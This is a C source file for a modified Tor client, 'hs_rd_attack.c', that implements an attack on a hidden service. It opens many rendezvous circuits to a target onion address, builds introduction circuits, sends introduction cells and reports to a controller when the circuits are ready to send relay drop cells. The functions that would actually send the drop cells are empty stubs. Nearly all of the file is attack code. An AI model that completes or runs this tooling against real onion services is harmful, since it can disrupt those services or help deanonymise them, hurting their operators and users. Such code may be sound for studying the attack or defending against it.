/**
 * \file hs_rd_attack.c
 * \brief contains code to connect to request hidden service and send
 *  relay drop cells to it 
 **/

#include "hs_rd_attack.h"
/* Global variable but not accessible from other files
 * Allow the program to keep a state of the attack 
 *
 * A little bit sexier than extern variables, still messy
 * but ... Ca casse pas trois pattes a un canard :-)
 */

/*NOTE
 *
 * Use control_event to talk with controller
 *
 * Need event-based control to carry out the steps of the attack
 */
static hs_rd_attack_t *attack_infos = NULL;

hs_attack_stats_t* hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress, 
    int nbr_circuits, time_t *until) {
  log_debug(LD_REND, "HS_ATTACK : Entering hs_attack_entry_point\n");
  if (!attack_infos){
    log_debug(LD_REND,"HS_ATTACK : initalize attack_infos\n");
    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
    attack_infos->rendcircs = smartlist_new();
    attack_infos->stats = (hs_attack_stats_t *)  tor_malloc(sizeof(hs_attack_stats_t));
    attack_infos->retry_intro = 0;
    attack_infos->stats->tot_cells = 0;
    attack_infos->stats->nbr_rendcircs = 0;
    /*attack_infos->extend_info = NULL;*/
    attack_infos->current_target = strdup(onionaddress);
    //attack_infos->rend_data = NULL;
    //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
  }
  switch(cmd) {
    case ESTABLISH_RDV:
      // Establish all rendezvous circuits
      if (hs_attack_init_rendezvous_circuits(nbr_circuits, onionaddress) < 0) {
        log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
        return NULL;
      }
      if (hs_attack_init_intro_circuit(attack_infos->retry_intro) < 0) {
          log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
          return NULL; 
      }
      break;
    case SEND_RD: hs_attack_launch(until); break;
    default: break;
  }
  return attack_infos->stats;
}

int hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
  log_debug(LD_REND,"HS_ATTACK : entering hs_attack_init_rendezvous_circuits\n");
  int c = 0;
  while (attack_infos->rendcircs->num_used < nbr_circuits) {
    circ_info_t *circmap = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
    circmap->extend_info = NULL;
    circmap->introcirc = NULL;
    circmap->state_intro = CIRC_NO_STATE;
    circmap->state_rend = REND_CIRC_BUILDING;
    log_debug(LD_REND, "HS_ATTACK: launching rend circuit");
    circmap->rendcirc = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
        CIRCLAUNCH_IS_INTERNAL);
    if (circmap->rendcirc) {
      log_info(LD_REND, "HS_ATTACK : rendcircuit launched\n");
      circmap->rendcirc->rend_data =
        rend_data_client_create(onionaddress, NULL, NULL, REND_NO_AUTH);
      smartlist_add(attack_infos->rendcircs, circmap);
      attack_infos->stats->nbr_rendcircs++;
    } else {
      log_debug(LD_REND, "rendcircuit not launched\n");
      c++;
      tor_free(circmap);
      if (c >= RETRY_THRESHOLD*nbr_circuits)
        return -1;
    }
  }
  return 0;
}

/*
 * Create a circuit towards the introduction point and send
 * nbr_circuits different INTRO1 cells
 */

int hs_attack_init_intro_circuit(int retry) {
  //uint8_t flags = CIRCLAUNCH_ONEHOP_TUNNEL;
  uint8_t flags = CIRCLAUNCH_NEED_UPTIME;

  if (retry == 0){
    log_debug(LD_REND, "HS_ATTACK: Entering hs_attack_init_intro_circuit\n");
    /* kind of hack. We don't any circuit yet
     * to use as introducing circuit. Launch one and wait
     * until we can canibilize it*/
    SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
      circmap->introcirc = circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, flags);
    } SMARTLIST_FOREACH_END(circmap);

    attack_infos->retry_intro++;
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
    return 0; 
  }
  
    /*
     * Fetch them one for all
     */
  int count_missing = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (!circmap->extend_info)
      circmap->extend_info = rend_client_get_random_intro(
          circmap->rendcirc->rend_data);
    if (!circmap->extend_info) {
      log_info(LD_REND,
          "HS_ATTACK: No intro point for '%s': re-fetching service descriptor an try later.\n",
          attack_infos->current_target);
      if (circmap->rendcirc)
        rend_client_refetch_v2_renddesc(circmap->rendcirc->rend_data);
      count_missing++;
    }
    else {
      log_debug(LD_REND, "HS_ATTACK: Yay! we have an intropoint : %s\n", extend_info_describe(
       circmap->extend_info));
    }
  } SMARTLIST_FOREACH_END(circmap);
  if (count_missing) {
    attack_infos->retry_intro++;
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
    return 0;
  }

  /*Completly mindfuck yeah but ... Look for a general circuit; change its role
   * and send intro request
   * without having build previously a GENERAL circ, we got null =>
   *  Always build a general circ before then build the circ we need for introduction*/
 // return 0;
  int count_failure = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (!circmap->state_intro) {
      circmap->introcirc = circuit_launch_by_extend_info(
          CIRCUIT_PURPOSE_C_INTRODUCING, circmap->extend_info, flags);
      if (circmap->introcirc){
        circmap->state_intro = INTRO_CIRC_BUILDING;
        log_debug(LD_REND, "HS_ATTACK: Intro circ building. Swibidi yay !\n");
      }
      else
        count_failure++;
    }
  } SMARTLIST_FOREACH_END(circmap);
  if (count_failure && retry < RETRY_THRESHOLD*count_failure) {
    //build a general circ and tell the client to retry in a few seconds
    log_info(LD_REND, "HS_ATTACK: Something went wrong when building\
                       introcirc -- retry with new extend_info next time\n");
    //could do this with subtype of event like INFO : RETRY_INTRO
    //but it would be less nice on client side
    /*we have circuit; change its purpose*/
    attack_infos->retry_intro++;
    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
    return 0;
  }
  else if (count_failure && retry >= RETRY_THRESHOLD*count_failure) {
    //tor_free(attack_infos->circ_to_intro->circ);
    //tor_free(attack_infos->circ_to_intro);
    return -1;
  }
  log_info(LD_REND, "HS_ATTACK: We have an intro circ ready building or ready !\n");
  return 0;
}

/*
 * Called by rend_client_rendezvous_acked to launch introcell 
 * or when the intro circ opened
 * if introcel circuit is ready
 */

//TODO code duplication to fix
void hs_attack_send_intro_cell_callback(origin_circuit_t *rend_or_intro_circ){
  //return;
  int retval=0;
  log_debug(LD_REND, "HS_ATTACK: send_intro_cell_callback called !\n");
  
  int launch = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (rend_or_intro_circ == circmap->rendcirc) {
      if (circmap->state_intro == INTRO_CIRC_READY)
        launch = 1;
    }
    if (rend_or_intro_circ == circmap->introcirc) {
      if (circmap->state_rend == REND_CIRC_READY_FOR_INTRO)
        launch = 1;
    }
    if (launch){
      circmap->introcirc->rend_data = circmap->rendcirc->rend_data;
      retval = rend_client_send_introduction(circmap->introcirc,
          circmap->rendcirc);
      if(retval < 0)
        log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
      circmap->state_rend = REND_CIRC_INTRO_CELL_SENT;
      circmap->state_intro = REND_CIRC_INTRO_CELL_SENT;
      return;
    }
  } SMARTLIST_FOREACH_END(circmap);

}

/*
 * Received a rendezous2 cell on circ; circ joined and is
 * now ready to send relaydrop cells
 * Send message to the controller if all circs are ready
 */
void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
  int count_ready = 0;
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (circmap->rendcirc == rendcirc) {
      log_debug(LD_REND,"HS_ATTACK: Marking rendezvous circuit ready");
      circmap->state_rend = REND_CIRC_READY_FOR_RD;
    }
    if (circmap->state_rend == REND_CIRC_READY_FOR_RD)
      count_ready++;
  } SMARTLIST_FOREACH_END(circmap);
  if (count_ready == attack_infos->rendcircs->num_used)
    //tell controller that we are ready to launch the attack
    control_event_hs_attack(HS_ATTACK_RD_READY);
}

void hs_attack_mark_rendezvous_ready_for_intro(origin_circuit_t *rendcirc) {
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
    if (circmap->rendcirc == rendcirc) {
      log_debug(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");
      circmap->state_rend = REND_CIRC_READY_FOR_INTRO;
      return;
    }
  } SMARTLIST_FOREACH_END(circmap);
  log_debug(LD_REND, "HS_ATTACK: rendcirc not in the list !\n");
}

void hs_attack_mark_intro_ready(origin_circuit_t *introcirc) {
  log_debug(LD_REND, "HS_ATTACK: Marking Introcirc ready\n");
  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
    if (circmap->introcirc == introcirc) {
      circmap->state_intro = INTRO_CIRC_READY;
      return;
    }
  }SMARTLIST_FOREACH_END(circmap);
}

void hs_attack_launch(time_t *until) {

}

/*
 * Almost a copy of 
 *
 * Create a valid relay drop cell for session with circuit circ and sent it through circ
 *
 * If the cell cannot be sent, we mark the circuit for close and return -1
 */

int send_rd_cell(circuit_t *circ){
  return 0;
}

void free_hs_rd_attack(){

}

